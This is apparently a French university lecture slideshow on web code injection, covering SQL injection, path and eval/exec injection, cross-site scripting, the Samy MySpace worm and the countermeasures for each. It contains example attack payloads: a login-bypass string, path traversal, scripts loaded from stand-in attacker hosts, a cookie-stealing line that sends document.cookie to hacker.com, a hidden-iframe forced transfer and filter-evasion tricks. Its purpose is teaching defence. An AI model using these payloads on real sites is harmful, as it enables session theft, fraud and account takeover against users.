---
layout: slideshow
title: Injections de code
subtitle: Injections SQL, Cross Site Scripting
scripts: ['http://coffeescript.org/extras/coffee-script.js']
---

<section>

## Ne jamais se fier au client

Toutes les données en provenance du client :

- Entêtes HTTP,
- Paramètres de l'URL, *query string*
- Corps de la requête, données des formulaires,
- Cookies, Storage API,

peuvent contenir des valeurs **non valides**, pour plusieurs raisons :

- L'utilisateur a fait une erreur de saisie ;
- Le client n'utilise pas JavaScript ;
- Le client est un robot ;
- L'utilisateur est un hacker qui cible votre site.

Pour toutes ces raisons, le code du server **doit toujours vérifier**
les données envoyées par le client.

</section>
<section>

## J'insiste !

**Vérifiez les données**, même si...

- ...vous utilisez des formulaires HTML5 ;
- ...vos champs/données sont *cachés* ;
- ...vous *validez* vos formulaire avec JavaScript ;
- ...les données sont *générées* de façon programmatique (pas saisies
  par l'utilisateur) par le code client.

Faciles à contourner en **lisant/éditant le source**. Exemple:

<form style="border: solid thin #aaa; border-radius: 5px; box-shadow: 1px 1px 1px #ccc; width: 90%;margin: auto">
Saisissez un nombre : <input pattern="[0-9]*"/><input type="submit" value="Submit">
</form>

Seules les données gérées *entièrement par le server* sont fiables :

- Variables locales, sessions, caches, fichiers, bases de données...

> Ce que vous voyez, n'est pas ce que le hacker voit !
{:.cite}

</section>
<section>

## Notre modèle de sécurité

Nous allons supposer qu'un utilisateur malveillant veut s'attaquer à
notre site. Nous allons faire des hypothèses sur ses moyens :


- Il peut faire **uniquement** des requêtes HTTP(S) au server, à travers
  un browser ou par d'autres moyens, et lire les réponses ;
- Il **connaît le code source** de l'application web (crédible pour une
  application open source) ;
- Il **ne peut pas** intercepter ou modifier une connexion entre un
  autre client et le server ;

Les buts du hacker peuvent être multiples : compromettre le server,
voler des données, ...


</section>
<section>

# Injections SQL

</section>
<section class="compact">

## Un premier exemple

Considérez le code suivant, qui vérifie la connexion d'un utilisateur.

~~~
$user = $req->request->get('user');
$pass = $req->request->get('pass');
$sql = "SELECT * FROM users
        WHERE login='$user' AND password='$pass'";
if ($app['db']->fetchAssoc($sql)) {
  // utilisateur connecté
}
~~~
{:.php}

L'utilisateur envoie les paramètres suivants dans le corps de la requête :

~~~
user=root
pass=' OR '1'='1
~~~

La chaîne `$sql` vaudra alors

~~~
SELECT * FROM users
WHERE login='root' AND password='' OR '1'='1'
~~~

La condition est toujours vérifiée : **le hacker est connecté en tant
que root!**

</section>
<section>

### Que peut-on faire avec les injections SQL ?

- Escalade de droits (se faire passer pour *root*),
- Vol de données (lire la base),
- Compromission de la base de données (effacer/modifier les données).


![](http://imgs.xkcd.com/comics/exploits_of_a_mom.png)
{:.centered style="max-width:100%"}

Et voici une
[liste de attaques par injection SQL documentées](http://en.wikipedia.org/wiki/SQL_injection#Examples).

</section>
<section>

## Contrer les injections SQL

On connaît la solution : **échapper les caractères spéciaux** `'`,  `"`,  `;`

- PHP : `mysqli::real_escape_string`,
- PDO/Doctrine : `PDO::quote`, `Doctrine::quote`,
- Échappement automatique : **requêtes préparées**.

Exemple

~~~
$app['db']->fetchAssoc("SELECT * FROM users
  WHERE login=? AND password=?",
  array($user, $pass)
);
~~~
{:.php}

Résultat

~~~
SELECT * FROM users
WHERE login='root' AND password=''' OR ''1''=''1'
~~~

</section>
<section>

# Autres types d'injection

</section>
<section>

## Injection de chemin

N'écrivez jamais ce code :

~~~
$page = $req->query->get('page');
return $app['twig']->render($page);
~~~
{:.php}

Le hacker pourrait passer un chemin non prévu :

~~~
?page=../../config.php
~~~

et éventuellement lire les données privées du site. Encore pire :

~~~
$page = $req->query->get('page');
include($page);
~~~
{:.php}

Pourrait exécuter du code non sollicité.

</section>
<section>

### Comment se protéger ?

Avoir une *liste des chemins autorisés* :

~~~
$pages = array(
	'un_template.html',
	'autre_template.html',
	...);
	
if ($page in $pages) {
  return $app['twig']->render($page);
} else {
  return new Response(404);
}
~~~
{:.php}

</section>
<section>

## Injection dynamique de code

Techniques permettant d'*exécuter du code arbitraire sur le server*.

- La fonction `eval` exécute du code PHP contenu dans une chaîne
  
  ~~~
  eval($req->query->get('toto'));
  ~~~
  {:.php}

- La fonction `exec` exécute des programmes externes
  
  ~~~
  exec('ls -l ' . $req->query->get('dir'));
  ~~~
  {:.php}

**Contre-mesure :** simplement à éviter !

</section>
<section class="compact">

## Injections de HTML

Les injections dans la sortie HTML générée sont aussi appelées
**Cross-Site Scripting** (XSS).

~~~
$user = $req->cookies->get('user');
return "
<body>
  <h1>Bonjour, $user !</h1>
</body>";
~~~

Le hacker pourrait envoyer le cookie

~~~
user=<script src="http://hacker.org/attack.js"></script>
~~~

Ce qui générerait le code HTML suivant

~~~
<body>
<h1>Bonjour,
<script src="http://hacker.org/attack.js"></script> !</h1>
</body>
~~~

En général, ceci ne constitue pas une **menace** pour le server, mais
**pour l'utilisateur** !

</section>
<section>

### Se protéger de XSS

Échapper les caractères spéciaux : `<`,  `>`,  `&`, `"`, `'`, ...

- Avec la fonction `htmlspecialchars()` de PHP,
- Avec la fonction `$app->escape()` de Silex,
- Par l'échappement automatique de Twig, ou d'un autre moteur de
  templates (voir aussi [Cours 4](class4#chappement-dans-twig)).

#### Résultat

~~~
<body>
<h1>Bonjour,
&lt;script src=&quot;http://hacker.org/attack.js&quot;?gt;&lt;/script&gt; !</h1>
</body>
~~~

</section>
<section>

# Attaques par XSS

</section>
<section>

## Cross site scripting

On estime que 80% des failles de sécurité des application web sont des
failles XSS.

#### Que peut-on faire avec XSS ?

- Changer l'apparence d'une page, la défigurer (recerchez
  [Stallowned](http://www.google.com/search?q=stallowned)).
- Rédiriger et *phisher*.
- Vols des cookies et des données privées !
- Propager l'exploit XSS comme un ver.
- **Controler le browser de la victime !!!**

Les attaques XSS comportent trois acteurs : le client (la victime), le
hacker et le server.

Elles nécessitent d'une part de *social engineering*.

</section>
<section>

## Injections de code

<svg width="1000" height="500" transform="scale(0.8)"
	viewBox="-282 54 1000 500"
	style="-webkit-transform: scale(0.8);-webkit-transform-origin:0 0;
	       -ms-transform: scale(0.8);-ms-transform-origin:0 0">
  <defs>
    <marker id="arrow" orient="auto"
       style="overflow:visible">
      <path
         d="M 0,0 5,-5 -12.5,0 5,5 0,0 z"
         transform="matrix(-0.8,0,0,-0.8,-10,0)"
		 fill="black" stroke="black"
         marker-start="none" />
    </marker>
  </defs>
  <g>
	<g id="boxes" style="fill:none;stroke:#000;stroke-width:0.6">
		<rect
		   style="stroke-dasharray:3, 1"
		   width="165"
		   height="281"
		   x="101"
		   y="158" />
		<rect
		   style="stroke-dasharray:3, 1"
		   width="156"
		   height="155"
		   x="-96"
		   y="250" />
		<rect
		   width="127"
		   height="82"
		   x="-222"
		   y="126" />
		<rect
		   style="fill:#000"
		   width="111"
		   height="65"
		   x="-214"
		   y="134" />
	</g>

	<g>
		<text x="120" y="146">
			Server</text>
		<text x="616" y="462">Client</text>
		<text
		   x="558"
		   y="117">Attaquant</text>
	</g>

	<g style="font-family:monospace;font-size:75%">
		<text
		   x="282"
		   y="224">GET /app?userval=<tspan style="fill:#ff0000;">code</tspan></text>
		<text
		   x="282"
		   y="366"><tspan
			 x="282"
			 y="366">POST /app</tspan><tspan
			 x="282"
			 y="386">....</tspan><tspan
			 x="282"
			 y="426">userval=<tspan style="fill:#ff0000">code</tspan></tspan></text>
		<text
		   x="282"
		   y="280"><tspan
			 x="282"
			 y="280">GET /app</tspan><tspan
			 x="282"
			 y="300">...</tspan><tspan
			 x="282"
			 y="320">Cookie: userval=<tspan style="fill:#ff0000">code</tspan></tspan></text>
		<text
		   style="fill:#ffffff"
		   x="-207"
		   y="155">$ system_</text>
		<text
		   x="-55"
		   y="310">$local</text>
		<text x="124" y="209">$req->query</text>
		<text x="117" y="260">$req->cookies</text>
		<text x="117" y="350">$req->request</text>
	</g>
	
	<g style="font-size:75%"> 
		<text
		   x="-110"
		   y="431">Gestionnaires de requête</text>
		<text
		   x="-27"
		   y="144">Database</text>
	</g>
	
	<g style="fill:none;stroke:#000;marker-end:url(#arrow)" id="arrows">
		<path
		   d="m 587,142 c 0,0 -46,44 -75,55 -17,6 -56,4 -56,4 l -218,0" />
		<path
		   d="m 612,145 c 0,0 -0,64 -22,83 -21,19 -71,23 -108,27 -70,8 -232,0 -233,0" />
		<path
		   d="m 615,433 c 0,0 -72,-16 -108,-34 -24,-11 -46,-45 -72,-47 -70,-5 -184,-4 -185,-4" />
		<path
		   d="m 120,201 c 0,0 -19,4 -26,15 C 94,216 69,254 44,267 36,271 9,281 0,277 -17,268 -10,260 -9,219" />
		<path
		   d="m 110,346 c -39,0 -84,0 -123,5 -31,3 -54,17 -56,24 -8,20 29,19 46,19 83,0 196,11 205,13 49,9 26,58 77,59 178,4 140,2 338,3" />
		<path d="m 629,130 24,287" />
		<path
		   d="m 25,220 c 0,0 10,0 -10,33 2,20 21,9 29,5 30,-12 41,-52 69,-69 15,-8 33,-12 50,-14 105,-13 216,33 319,5 31,-8 77,-45 85,-51"/>
		<path d="m 116,268 c 0,0 -17,18 -35,26 -18,7 -53,9 -59,10" />
		<path d="m -81,304 c 0,0 -41,-19 -55,-37 -11,-14 -18,-42 -21,-52" />
	</g>
	
	<g style="fill:none;stroke:#000;stroke-width:0.6;" id="db-cilinder">
		<path
		   d="m 32,167 c 0,7 -10,14 -22,14 -12,0 -22,-6 -22,-14 0,-7 10,-14 22,-14 12,0 22,6 22,14 z" />
		<path
		   d="m 32,203 c 0,7 -10,14 -22,14 -12,0 -22,-6 -22,-14 0,-7 10,-14 22,-14 12,0 22,6 22,14 z" />
		<path d="m -12,166 0,36" />
		<path d="m 32,166 0,36" />
	</g>
	
    <path id="frontier"
       style="fill:none;stroke:#000;stroke-dasharray:1, 2;stroke-dashoffset:0"
       transform="translate(60,-70) scale(1,1.3)"
       d="m 261,74 c 0,0 101,14 151,36 52,23 96,42 111,87 17,55 25,133 8,189 -10,36 -29,55 -68,75 -44,22 -166,39 -166,39" />
  </g>
</svg>

</section>
<section class="compact">

## Cross Site Scripting

Le Cross Site Scripting (XSS) est l'injection de code HTML/JavaScript
**dans la réponse envoyée au client**.

**Schema de base :** Le server *reflète* les données du client **sans
  filtrer**

~~~
$search = $req->query->get('search');
return "<input type='text' name='search' value='$search' />";
~~~

Le hacker *injecte* le code dans la page web

~~~
http://www.example.com/?
 search='><script src='http://hackers.com/evil.js'></script>
 <br class='
~~~
{:no-highlight}

Résultat

~~~
<input type='text' name='search' value=''>
<script src='http://hackers.com/evil.js'></script>
<br class='' />
~~~
{:.html}

La victime visite `www.example.com`, mais le code JavaScript étranger
`evil.js` s'exécute.

</section>
<section class="compact">

## XSS permanent et reflété

**XSS reflété :** Le code est injecté quand le client visitele lien

- Query string
- Formulaires
- Résultats de recherche

~~~
From: "order-update@amazon.com" <order-update@amazon.com>
Subject: Amazon.com - Your Cancellation (175-2364376-728612)

<html><body>
Your order has been successfully canceled. For your reference,
here's a summary of your order:<br />

You just canceled order <a
href="http://www.amazon.com/?var=<script>injection()</script>">#175-2364376-728612</a>
placed on February 16, 2012. ...
~~~

**XSS permanent :** Le code est stocké sur le server (probablement,
  dans la BD)

- Billets de blog, forums, ...
- Réseaux sociaux.

</section>
<section>

## Palliatif : Cross-domain policy

> À aucun moment un script d'un domaine (par ex. `www.hacker.com`)
> doit pouvoir accéder à partir d'un document au contenu d'un domaine
> diffèrent (par ex.  `www.example.com`).


### La cross-domain policy est mise en place pour

- Cookies ;
- Requêtes AJAX ;
- Contenu de frames et iframes.

### Exceptions (nécessaires)

- Images, audio, vidéos ;
- Scripts ;
- URL des frames et iframes.

</section>
<section>

## Exemple : vol de cookies

Seul le **domaine propriétaire** devrait pouvoir lire ses propres
cookies.

~~~
HTTP/1.1 200 OK
Set-Cookie: sessid=a10340f0e; Domain=www.mybank.com; Path=/; Secure;
~~~
{:.compact}

Si le hacker peut injecter le code suivant

~~~
document.write("<img src='https://hacker.com/ck.php?"
               + document.cookie + "' />");
~~~
{:.compact}

lorsque la victime visite la page ciblée, le hacker reçoit une requête
pour

~~~
https://hacker.com/ck.php?sessid=a10340f0e
~~~

Ce qui lui révèle l'**identifiant de session de la victime**.

</section>
<section>

## Pourquoi `<img>` ?

La balise `<img>` est utilisé souvent pour envoyer des données de la
victime à l'attaquant :

~~~
<img src='https://hacker.com/ck.php?sessid=a10340f0e' />
~~~
{:.compact}

- Presque tous les browsers savent la gérer,
- Connexion silencieuse (pas d'interaction utilisateur, pas de confirmation),
- Rarement filtrée.

</section>
<section class="compact">

## Autre possibilité : `<iframe>`

`<iframe>` permet d'inclure une page dans une autre

~~~
<iframe src="http://en.wikipedia.org/wiki/Framing_(World_Wide_Web)"></iframe>
~~~

<iframe src="http://en.wikipedia.org/wiki/Framing_(World_Wide_Web)" style="width:80%;margin-left:10%" name="if">
</iframe>


JavaScript peut contrôler le comportement de l'iframe :
<input type="button" onclick="window.frames.if.location.href='http://www.w3schools.com/tags/tag_iframe.asp'" value="Changer page" />

~~~
window.frames.hf.location.href =
  'http://www.w3schools.com/tags/tag_iframe.asp';
~~~

Les `<iframes>` *invisibles* peuvent être utilisés pour :

- Faire des requêtes HTTP sans que l'utilisateur s'en aperçoive ;
- Étendre une faille XSS dans une page au site tout entier ;
- Traverser des frontières de domaine.

</section>
<section class="compact">

## Un exemple avec `<iframe>`

- Le hacker injecte le script dans une page vulnérable

~~~
http://www.example.com/vulnerable?
  lang=en"></script src="http://hacker.com/evil.js"></script>
~~~

- Le script ajoute un `<iframe>` caché au document

~~~
document.write(
  '<iframe name="hf" style="display:none"></iframe>');
~~~

- Après quelques seconde, le script génère une requête à une page
  sécurisée

~~~
function req() {
  window.frames.hf.location.href=
    'http://www.example.com/transfer?to=hacker&amount=10000';
}
setTimeout(req, 5000);
~~~
{:.javascript}

- La réponse à `transfer` est envoyée au frame, l'utilisateur
  ne s'est aperçu de rien.

</section>
<section class="compact">

## Comment se protéger

**HTML Entities:** échapper, échapper, échapper !

~~~
<script>alert("XSS");</script>
~~~

~~~
&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
~~~

**Filtrer** (par ex., avec les templates)

~~~
<p>Hi, {{req.query.name}}!</p>
~~~

**Mieux vaut une whitelists qu'une blacklists**

Le code JavaScript peut être inséré dans HTML, CSS, SVG, ... S'il est
nécessaire d'autoriser l'utilisateur à insérer des balises dans le
document, permettez seulement

- Des balises sûres : `<img>`, `<div>`, `<p>`, ...
- Des attributs sûrs : `src`, `href`, `id`, `class`, ...


**Utilisez des bibliothèques de sanitization**

</section>
<section class="compact">

## Contourner les protections

### Utiliser des encodages différents

Exemple de *URL encoding*

~~~
// <script>alert("XSS");</script>
%3Cscript%3Ealert%28%22XSS%22%29;%3C%2Fscript%3E
~~~

Avec les codes ASCII (par ex., 34 est `"`)

~~~
document.write('href=' + String.fromCharCode(34) +
  'http://hacker.com/' + String.fromCharCode(34));
~~~

### Casser les mots clefs filtrés

En supposant que `onload` soit blacklisté :

~~~
var stmt = "window.onl" + "ad = myfunc";
eval(stmt);
~~~

### Exploiter les bugs des browsers (surtout IE)

</section>
<section>

# Étude de cas : le *worm* Samy

</section>
<section>

## Vers XSS : Samy

- Le 11 avril 2005 à 1h un ver basé sur une injection XSS commence à
  se répandre sur MySpace.
- En moins de 24h, plus d'un million de profiles sont infectés.
- MySpace est contraint à fermer le site pendant plusieurs heures pour
  extirper le ver.


#### Comment marche Samy
{: style="margin-bottom: -20px"}

1. MySpace permets une personnalisation limitée de la page de
   profile. Samy découvre qu'il peut inclure du JavaScript dans cette page.
2. Un utilisateur visite un profil infecté, le JavaScript malicieux
   s'exécute dans le browser de l'utilisateur.
3. Le JavaScript malicieux envoi une demande d'amitié à Samy, puis
   ajoute Samy aux *héros* de l'utilisateur.
4. Enfin, le JavaScript malicieux se copie dans le profil de
   l'utilisateur. L'infection peut grandir de façon exponentielle !

Lire l'histoire complète à <http://fast.info/myspace/>.

</section>
<section class="compact">

## Comment a-t-il fait ?

### Injection des scripts

- MySpace bloque `</script>`, `onxxx`, ...
- Mais certains browsers acceptent du JavaScript dans les
  attributs CSS.

~~~
<div style="background:url('javascript:alert(1)')">
~~~

### Imbriquer les guillemets quotes (à mon avis, l'astuce la plus jolie)

- L'astuce précédente a déjà utilisé un guillemet simple `'` et un
  double `"`.
- Samy doit encoder des chaînes en JavaScript, mais MySpace filtre
  `\'` et `\"`.
- Par exemple, Samy ne peut pas écrire :
  
~~~
<div style="background:url('javascript:alert("hah!")')">
<div style="background:url('javascript:alert('hah!')')">
<div style="background:url('javascript:alert(\'hah!\')')">
~~~

- Idée : mettre le source JavaScript dans un autre attribut (utilise
  `document.all`, spécifique à IE).
  
~~~
<div id="mycode" expr="alert('hah!')" style=
  "background:url('javascript:eval(document.all.mycode.expr)')"> 
~~~
{:.compact}

</section>
<section>

### Déclarer le code JavaScript

- MySpace filtre le mot "javascript".
- Samy exploite une "feature" de IE.

~~~
<div ... style="background:url('java
script:eval(...)')">
~~~

### Un peu de encodage et de césures par ci et par là

~~~
console.log('double quote: ' + String.fromCharCode(34));
eval('document.body.inne' + 'rHTML'); 
eval('xmlhttp.onread' + 'ystatechange = callback'); 
~~~
{:.compact}

### GET and POST

- Samy doit générer des requêtes (amitié, modification de profil, ...)
- Il aurait probablement pu utiliser les iframes, mais il a trouvé
  plus simple de générer des requêtes AJAX.


</section>
<section>

### Redirection

- Maintenant Samy est confronté à un *mur cross-domain* (entre
  `profile.myspace.com` et `www.myspace.com`).
- Il rédirige l'utilisateur vers `www.myspace.com`.

~~~
if (location.hostname == 'profile.myspace.com')
  document.location = 'http://www.myspace.com' +
  location.pathname + location.search; 
~~~

### Jetons cachés

- MySpace demande une confirmation avant d'ajouter un ami : il utilise
  un `<input>` caché avec une valeur aléatoire. (Il s'agit d'une
  protection [CSRF](class8)).
- Avec XSS, il est simple de contourner les protections CSRF : Samy
  fait quelques requêtes GET et POST en plus pour simuler
  l'interaction avec l'utilisateur.


**LE code:** <http://fast.info/myspace/>

</section>
<section>

## Frameworks d'injection

### Contrôler le browser de la victime à distance !

- Obtenier de l'information sur les victimes ;
- Accéder au stockage locale ;
- Déclencher des actions ;
- **Canaliser la navigation HTTP !!!**

### Combinent les attaques XSS avec les vulnérabilités des browsers (plus efficaces sur les vieux browsers)

- XSS Framework: <http://code.google.com/p/xssf/>;
- Browser Exploitation Framework: <http://beefproject.com/>.

</section>
<section>

## Le mot de la fin

### Pourquoi XSS existe-t-il ?

- Une confusion entre **données** et **logique** ;
- Une priorité donnée à la **facilité de programmation** plutôt qu'à
  la **sécurité** par les acteurs majeurs.

### XSS ne va pas disparaître bientôt...

**Règle 1 :** Sanitisez vos données !

**Règle 2:** Analysez les flux de données, concevez modulairement.

**Règle 3:** Utilisez des frameworks web.

**Règle 3:** (Si vous êtes un professionnel) Utilisez des outils de
  *penetration testing*.

</section>
<section>

## Lectures

- OWASP foundation wiki <https://www.owasp.org>
- OWASP [WebScarab](https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project) HTTP proxy;
- [Burp Scanner](http://portswigger.net/burp/scanner.html) penetration testing;
- OWASP [WebGoat](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project) security training platform.

</section>

